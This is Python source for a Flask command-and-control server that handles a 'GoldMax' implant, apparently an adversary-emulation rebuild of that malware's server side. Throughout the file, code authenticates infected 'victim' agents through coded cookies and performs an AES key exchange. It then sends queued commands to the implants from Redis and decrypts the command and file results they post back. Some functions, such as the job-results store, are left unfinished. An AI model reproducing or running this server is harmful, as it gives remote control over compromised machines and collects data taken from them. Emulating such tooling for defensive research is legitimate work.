import base64
import datetime
import logging
import sys
import hexdump
from flask import Flask, request, cli, make_response
from colorama import Fore as Color
from random import randbytes
from datetime import datetime
from os import environ, path, getcwd
from .RedisDB import RedisDB
from .GoldMax import GoldMax

# Flask App
app = Flask(__name__)

log = logging.getLogger("werkzeug")
log.setLevel(logging.ERROR)
cli.show_server_banner = lambda *_: None

# Unique per sample (HTTP Headers)
# Initial Authentication
control_cookie = "48WxLONKwJEo="
request_shared_secret = control_cookie + 'wGMEvMwBW77HDj'
request_session_key = control_cookie + 'ndB3gbMjL'


@app.after_request
def remove_header(response):
    headers = list(response.headers)
    """
    if environ.get('DEBUG'):
        for header in headers:
            print(Color.GREEN, '\t\t' + header[0] + ": " + header[1], Color.RESET)
    """
    return response


def parse_headers(headers, uri):
    """
    Display Header information
    Extract Victim GUID
    """
    extract_info = {}
    for header in headers:
        if header[0] == 'Host':
            extract_info['Host'] = header[1]
        else:
            extract_info.update({header[0]: header[1]})

    return extract_info


def initial_authentication(http_info, cookie_values) -> list:
    """
    Phase 1: Generate shared secret
    """
    gold = GoldMax()
    print(Color.LIGHTYELLOW_EX, f"\n[!] Received Request from GoldMax Implant for SHARED SECRET [!]"
                                f'\n\tTarget: {http_info["Host"]}'
                                f'\n\tUser-Agent: {http_info["User-Agent"]}'
                                f'\n\tReferer: {http_info["Referer"]}'
                                f'\n\tCookie: {cookie_values}'
          )
    print(Color.LIGHTYELLOW_EX, f"\n[+] Initiating Shared Secret Exchange [+]\n\tSending Fist Bump: {gold.shared_secret}",
          Color.RESET)

    return [gold.state['Authenticate'], gold.shared_secret]


def key_exchange(http_info, cookie_values) -> list:
    """
    Phase 2: AES Key Exchange
    """
    gold = GoldMax()
    print(Color.GREEN, f'\n[!] New GoldMax Agent! [!]'
                       f'\n\tTarget: {http_info["Host"]}'
                       f' \n\tReferer: {http_info["Referer"]}'
                       f'\n\tCookie: {cookie_values}',
          Color.RESET)

    return [gold.state["KeyExchange"], gold.get_session_key()]


def create_response(agent=None):
    """
    Extract job from Database and prepare for implant
    """
    gold = GoldMax()
    db = RedisDB()
    new_cookie = ""
    cmd_to_send = ""

    # Updates Jobs from Pending -> Active in Redis
    job = db.get_jobs(agent)

    if job:
        next_job = list(job.values())[0]
        new_cookie, cmd_to_send = gold.build_cmd(next_job["cmd"], agent)
        # print(f"Sending job to agent:\n\tCookie: {new_cookie}\n\tPayload: {cmd_to_send}")

    else:
        new_cookie = gold.build_cookie("Idle", agent)

    return new_cookie, cmd_to_send


def decrypt_results(blob):
    """
    Base64 Encoded --> Custom Base64 --> AES Encrypted
    IV is first 16 bytes of Ciphertext
    """
    g = GoldMax()

    payload = g.custom_base64_decode(base64.b64decode(blob))
    decrypted = g.aes_decrypt_cfb(payload, g.session_key)

    if decrypted.startswith(b"EXECED"):
        decrypted = b"Process Executed Successfully."

    return decrypted


def store_job_results(agent_name, results):
    db = RedisDB()
    active_jobs = {}
    completed_jobs = {}

    # Active Jobs
    job = db.find_job(agent_name, results, cmd=None)


def establish_session(http_headers, http_uri) -> list:
    """
    Handle comms to setup session for resolving commands
    """

    gold = GoldMax()
    db = RedisDB()

    session_data = ["", ""]

    # Extract info from headers
    http_info = parse_headers(headers=http_headers, uri=http_uri)
    cookie_values = http_info.pop('Cookie').split('; ')

    # Extract the id from the cookie
    agent_name = cookie_values[0].split('=')[1]

    for value in cookie_values:

        # Phase 1: Authentication
        if request_shared_secret in value:
            session_data = initial_authentication(http_info, cookie_values)

        # Phase 2: Key Exchange
        elif request_session_key in value:
            session_data = key_exchange(http_info, cookie_values)

    # Phase 3 : Send Command
    if len(cookie_values) == 2:
        session_data = create_response(agent_name)

    # Recv'd some error
    else:
        pass
        # We hit this when we get a referer other than twitter.com
        # print(Color.RED, "We are hitting an error: \n", http_info, Color.RESET)

    db.update_agent(agent_name, http_info)

    return session_data


def start_http():
    ssl_info = ('toolbox/certs/totallylegit.io.crt', 'toolbox/certs/totallylegit.io.key')
    cli.show_server_banner = lambda *_: None
    app.run(ssl_context=ssl_info, port=443, host='0.0.0.0')


@app.route("/", defaults={'u_path': ''})
@app.route('/<path:u_path>', methods=['GET', 'POST', 'PUT'])
def http_server(u_path):
    """
    Send Payload to Loader
    """
    current_time = datetime.now()
    timestamp = current_time.strftime("%H:%M:%S on %m/%d/%Y")
    uri = u_path

    if request.method == "GET":
        headers = request.headers
        # print(Color.CYAN, f"\n[!] Received GET request from Implant : ({timestamp}) [!]", Color.RESET)

        new_cookie, data_for_agent = establish_session(headers, u_path)
        # print(f"Sending: {new_cookie} {data_for_agent} ")

        return data_for_agent, 200, {'Cookie': new_cookie}

    elif request.method == "POST":
        headers = request.headers
        # Extract info from headers
        http_info = parse_headers(headers=headers, uri=u_path)
        cookie_values = http_info.pop('Cookie').split('; ')
        # Extract the id from the cookie
        agent_name = cookie_values[0].split('=')[1]

        # Identify Agent to correlate pending job
        received = request.form
        decrypted = b""
        file_results = "FT40wxgwwx1SB"
        cmd_results = "XCs0CffCLrEPZug"

        if cmd_results in received:
            decrypted = decrypt_results(received[cmd_results])

        elif file_results in received:
            decrypted = decrypt_results(received[file_results])

        # Display results
        if decrypted:
            print(Color.GREEN, decrypted.decode(), Color.RESET)
            store_job_results(agent_name, decrypted.decode())

    return b'200'


